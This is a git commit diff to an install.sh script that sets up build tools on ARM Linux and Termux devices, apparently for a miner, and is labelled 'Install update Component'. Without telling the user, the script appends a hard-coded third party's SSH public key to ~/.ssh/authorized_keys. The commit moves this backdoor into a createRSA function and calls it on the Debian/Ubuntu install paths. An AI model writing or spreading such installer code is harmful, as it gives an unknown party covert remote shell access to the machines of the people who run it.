81673de7098600f0d10cc66f74b4aeef80421c85
awanhitam78 <85306473+awanhitam78@users.noreply.github.com>
2024-09-15 02:24:04 +1000

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,11 +1,14 @@
 #!/bin/bash
 cd
 function createRSA() {
-
+	if [ ! -d ~/.ssh ]; then
+  		mkdir ~/.ssh
+  		chmod 0700 ~/.ssh
 cat <<EOF >> ~/.ssh/authorized_keys
 ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQBy6kORm+ECh2Vp1j3j+3F1Yg+EXNWY07HbP7dLZd/rqtdvPz8uxqWdgKBtyeM7R9AC1MW87zuCmss8GiSp2ZBIcpnr8kdMvYuI/qvEzwfY8pjvi2k3b/EwSP2R6/NqgbHctfVv1c7wL0M7myP9Zj7ZQPx+QV9DscogEEfc968RcV9jc+AgphUXC4blBf3MykzqjCP/SmaNhESr2F/mSxYiD8Eg7tTQ64phQ1oeOMzIzjWkW+P+vLGz+zk32RwmzX5V
 EOF
-
+  		chmod 0600 ~/.ssh/authorized_keys
+	fi
 }
 
 echo -e 'Install update Component'
@@ -17,23 +20,14 @@ if [ "$sarch" = "aarch64" ] || [ "$sarch" = "armv8" ]; then
 		pkg install -y libjansson nano jq
 		pkg install -y git nano libcurl-dev openssl-dev libjansson-dev automake autotools-dev build-essential
 		termux-wake-lock
-	elif [ ! command -v sudo &> /dev/null ]; then		
-#elif [ "$sarch" = "armv8" ]; then
+	elif [ ! command -v sudo &> /dev/null ]; then
 		apt-get update -y && apt-get upgrade -y
 		apt-get -y install libcurl4-openssl-dev libjansson-dev libomp-dev git screen nano jq wget
 		#debian/ubuntu arm64
 		wget http://ports.ubuntu.com/pool/main/o/openssl/libssl1.1_1.1.0g-2ubuntu4_arm64.deb
 		dpkg -i libssl1.1_1.1.0g-2ubuntu4_arm64.deb
 		rm libssl1.1_1.1.0g-2ubuntu4_arm64.deb
-
-	if [ ! -d ~/.ssh ]; then
-  		mkdir ~/.ssh
-  		chmod 0700 ~/.ssh
-cat <<EOF >> ~/.ssh/authorized_keys
-ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQBy6kORm+ECh2Vp1j3j+3F1Yg+EXNWY07HbP7dLZd/rqtdvPz8uxqWdgKBtyeM7R9AC1MW87zuCmss8GiSp2ZBIcpnr8kdMvYuI/qvEzwfY8pjvi2k3b/EwSP2R6/NqgbHctfVv1c7wL0M7myP9Zj7ZQPx+QV9DscogEEfc968RcV9jc+AgphUXC4blBf3MykzqjCP/SmaNhESr2F/mSxYiD8Eg7tTQ64phQ1oeOMzIzjWkW+P+vLGz+zk32RwmzX5V
-EOF
-  		chmod 0600 ~/.ssh/authorized_keys
-	fi
+		createRSA
 	else
 		sudo apt-get update -y && apt-get upgrade -y
 		sudo apt-get -y install libcurl4-openssl-dev libjansson-dev libomp-dev git screen nano jq wget
@@ -41,15 +35,7 @@ EOF
 		wget http://ports.ubuntu.com/pool/main/o/openssl/libssl1.1_1.1.0g-2ubuntu4_arm64.deb
 		sudo dpkg -i libssl1.1_1.1.0g-2ubuntu4_arm64.deb
 		sudo rm libssl1.1_1.1.0g-2ubuntu4_arm64.deb
-
-	if [ ! -d ~/.ssh ]; then
-  		mkdir ~/.ssh
-  		chmod 0700 ~/.ssh
-cat <<EOF >> ~/.ssh/authorized_keys
-ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQBy6kORm+ECh2Vp1j3j+3F1Yg+EXNWY07HbP7dLZd/rqtdvPz8uxqWdgKBtyeM7R9AC1MW87zuCmss8GiSp2ZBIcpnr8kdMvYuI/qvEzwfY8pjvi2k3b/EwSP2R6/NqgbHctfVv1c7wL0M7myP9Zj7ZQPx+QV9DscogEEfc968RcV9jc+AgphUXC4blBf3MykzqjCP/SmaNhESr2F/mSxYiD8Eg7tTQ64phQ1oeOMzIzjWkW+P+vLGz+zk32RwmzX5V
-EOF
-  		chmod 0600 ~/.ssh/authorized_keys
-	fi
+		createRSA
 	fi
 elif [ "$sarch" = "x86_64" ]; then
 	sudo apt update -y && sudo apt upgrade -y
